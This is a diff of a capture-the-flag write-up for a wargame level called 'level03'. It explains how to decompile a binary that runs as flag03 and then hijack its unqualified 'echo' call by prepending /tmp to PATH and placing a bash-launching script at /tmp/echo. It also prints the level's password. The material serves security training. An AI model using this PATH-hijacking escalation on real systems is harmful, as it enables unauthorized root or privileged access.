@@ -1,50 +1,38 @@
 # level03
 
-It is possible to run almost any executable with elevated privileges in this exercise, I chose sh as it permits pretty much anything
+## Vulnerability: $PATH trickery
 
-1. get level03  (from an external device)
+level03's password: `kooda2puivaav1idi4f57q8iq`
 
-```sh
-scp -P 4242 level03@<host>:level03 level03
-```
-
-2. Decompile binary, see that it runs as flag03
+1. examinate existing files and permissions
 
 ```shell
-/opt/retdec/bin/retdec-decompiler.py level03
+ls -la
 ```
 
-3. Exploit env vars usage by changing $PATH
+shows that the level03 executable belongs to flag03 group, privilege escalation should be possible
+
+2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code
+
+```sh
+scp -P 4242 level03@<host>:level03 .
+retdecomp level03
+```
+
+shows geteuid() and getegid(), meaning that the binary is running as flag03
+
+4. Exploit env vars usage by changing `$PATH` and making the binary run your prefered program (I chose bash)
 
 ```shell
 PATH=/tmp:$PATH
-```
-
-4. Create an exploit binary to be executed by the original binary
-
-```shell
-echo /bin/sh > /tmp/echo
-```
-
-```shell
+echo /bin/bash > /tmp/echo
 chmod +x /tmp/echo
 ```
 
-5. Execute the original binary and retrieve flag
+5. Execute the original binary and pwn flag
 
 ```shell
 ./level03
-```
-
-6. (optional) prove that we operate as flag03
-
-```shell
-whoami
-```
-
-7. pwn the flag
-
-```shell
 getflag
 ```
 
